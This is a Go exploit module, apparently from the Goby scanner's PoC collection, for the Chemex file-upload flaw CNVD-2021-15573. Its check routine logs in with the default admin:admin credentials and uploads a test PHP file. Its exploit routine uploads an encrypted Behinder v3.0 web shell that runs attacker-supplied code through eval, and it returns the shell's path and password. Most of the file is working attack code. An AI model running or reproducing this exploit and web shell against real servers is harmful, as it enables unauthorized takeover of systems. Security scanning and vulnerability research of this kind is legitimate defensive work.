package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Chemex Auth File Upload CNVD-2021-15573",
    "Description": "<p>Coffee pot Chemex is a free, open source, efficient and beautiful IT operation and maintenance management platform.</p><p>Chemex has a background file upload vulnerability(default login admin:admin), which can be exploited by attackers to gain control of the server.</p>",
    "Impact": "Chemex Auth File Upload CNVD-2021-15573",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/dcat-phper/chemex\">https://gitee.com/dcat-phper/chemex/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Chemex",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "Chemex 文件上传漏洞 （CNVD-2021-15573）",
            "Description": "<p>咖啡壶Chemex是一个免费、开源、高效且漂亮的IT运维管理平台。</p><p>Chemex存在后台文件上传漏洞，默认密码（admin:admin）攻击者可利用该漏洞获取服务器控制权。</p>",
            "Impact": "<p>Chemex存在后台文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://gitee.com/dcat-phper/chemex\">https://gitee.com/dcat-phper/chemex</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "咖啡壶",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Chemex Auth File Upload CNVD-2021-15573",
            "Description": "<p>Coffee pot Chemex is a free, open source, efficient and beautiful IT operation and maintenance management platform.</p><p>Chemex has a background file upload vulnerability(default login admin:admin), which can be exploited by attackers to gain control of the server.</p>",
            "Impact": "Chemex Auth File Upload CNVD-2021-15573",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/dcat-phper/chemex\">https://gitee.com/dcat-phper/chemex/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Chemex",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(title=\"咖啡壶\" || body=\"让IT资产管理更加简单\") && body=\"CreateDcat\"",
    "GobyQuery": "(title=\"咖啡壶\" || body=\"让IT资产管理更加简单\") && body=\"CreateDcat\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://gitee.com/dcat-phper/chemex",
    "DisclosureDate": "2021-02-02",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-15573"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-15573"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Chemex"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10225"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/auth/login"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					XSRFTOKENfind1 := regexp.MustCompile("XSRF-TOKEN=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					Chemexsessionfind1 := regexp.MustCompile("chemex_session=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					Tokenfind1 := regexp.MustCompile("\"token\":\"(.*?)\",").FindStringSubmatch(resp1.RawBody)
					uri2 := "/auth/login"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = true
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
					cfg2.Header.Store("Cookie", "XSRF-TOKEN="+XSRFTOKENfind1[1]+";chemex_session="+Chemexsessionfind1[1])
					cfg2.Data = "_token=" + Tokenfind1[1] + "&username=admin&password=admin&_token=" + Tokenfind1[1]
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						XSRFTOKENfind2 := regexp.MustCompile("XSRF-TOKEN=(.*?);").FindStringSubmatch(resp2.HeaderString.String())
						Chemexsessionfind2 := regexp.MustCompile("chemex_session=(.*?);").FindStringSubmatch(resp2.HeaderString.String())
						uri3 := "/"
						cfg3 := httpclient.NewGetRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.Header.Store("Cookie", "XSRF-TOKEN="+XSRFTOKENfind2[1]+";chemex_session="+Chemexsessionfind2[1])
						if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
							Tokenfind2 := regexp.MustCompile("\"token\":\"(.*?)\",").FindStringSubmatch(resp3.RawBody)
							uri4 := "/dcat-api/form/upload"
							cfg4 := httpclient.NewPostRequestConfig(uri4)
							cfg4.VerifyTls = false
							cfg4.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryBbowlZhO38AfN0NE")
							cfg4.Header.Store("Cookie", "XSRF-TOKEN="+XSRFTOKENfind2[1]+";chemex_session="+Chemexsessionfind2[1])
							cfg4.Data = fmt.Sprintf(`------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_id"
xHTgRTrpLMkEIniZ
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_token"
%s
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="upload_column"
file
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="primary_key"
null
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_form_"
App\Admin\Forms\UserImportForm
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="id"
WU_FILE_0
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="name"
2.php
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="type"
application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="lastModifiedDate"
Tue Sep 21 2021 23:02:59 GMT+0800 (中国标准时间)
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="size"
10273
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_file_"; filename="2.php"
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
<?php echo md5(233);unlink(__FILE__);?>
------WebKitFormBoundaryBbowlZhO38AfN0NE--`, Tokenfind2[1])
							if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil {
								Namefind := regexp.MustCompile("\"name\":\"(.*?)\",").FindStringSubmatch(resp4.RawBody)
								uri5 := "/uploads/files/" + Namefind[1]
								cfg5 := httpclient.NewGetRequestConfig(uri5)
								cfg5.VerifyTls = false
								if resp5, err := httpclient.DoHttpRequest(u, cfg5); err == nil {
									return resp5.StatusCode == 200 && strings.Contains(resp5.RawBody, "e165421110ba03099a1c0393373c5b43")
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/auth/login"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					XSRFTOKENfind1 := regexp.MustCompile("XSRF-TOKEN=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					Chemexsessionfind1 := regexp.MustCompile("chemex_session=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					Tokenfind1 := regexp.MustCompile("\"token\":\"(.*?)\",").FindStringSubmatch(resp1.RawBody)
					uri2 := "/auth/login"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = true
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
					cfg2.Header.Store("Cookie", "XSRF-TOKEN="+XSRFTOKENfind1[1]+";chemex_session="+Chemexsessionfind1[1])
					cfg2.Data = "_token=" + Tokenfind1[1] + "&username=admin&password=admin&_token=" + Tokenfind1[1]
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						XSRFTOKENfind2 := regexp.MustCompile("XSRF-TOKEN=(.*?);").FindStringSubmatch(resp2.HeaderString.String())
						Chemexsessionfind2 := regexp.MustCompile("chemex_session=(.*?);").FindStringSubmatch(resp2.HeaderString.String())
						uri3 := "/"
						cfg3 := httpclient.NewGetRequestConfig(uri3)
						cfg3.VerifyTls = false
						cfg3.Header.Store("Cookie", "XSRF-TOKEN="+XSRFTOKENfind2[1]+";chemex_session="+Chemexsessionfind2[1])
						if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
							Tokenfind2 := regexp.MustCompile("\"token\":\"(.*?)\",").FindStringSubmatch(resp3.RawBody)
							uri4 := "/dcat-api/form/upload"
							cfg4 := httpclient.NewPostRequestConfig(uri4)
							cfg4.VerifyTls = false
							cfg4.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryBbowlZhO38AfN0NE")
							cfg4.Header.Store("Cookie", "XSRF-TOKEN="+XSRFTOKENfind2[1]+";chemex_session="+Chemexsessionfind2[1])
							cfg4.Data = fmt.Sprintf(`------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_id"
xHTgRTrpLMkEIniZ
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_token"
%s
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="upload_column"
file
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="primary_key"
null
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_form_"
App\Admin\Forms\UserImportForm
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="id"
WU_FILE_0
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="name"
2.php
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="type"
application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="lastModifiedDate"
Tue Sep 21 2021 23:02:59 GMT+0800 (中国标准时间)
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="size"
10273
------WebKitFormBoundaryBbowlZhO38AfN0NE
Content-Disposition: form-data; name="_file_"; filename="2.php"
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; 
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
------WebKitFormBoundaryBbowlZhO38AfN0NE--`, Tokenfind2[1])
							if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil {
								Namefind := regexp.MustCompile("\"name\":\"(.*?)\",").FindStringSubmatch(resp4.RawBody)
								uri5 := "/uploads/files/" + Namefind[1]
								expResult.Output = uri5 + "-----------Using Behinder_v3.0 connection, password is rebeyond"
								expResult.Success = true
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
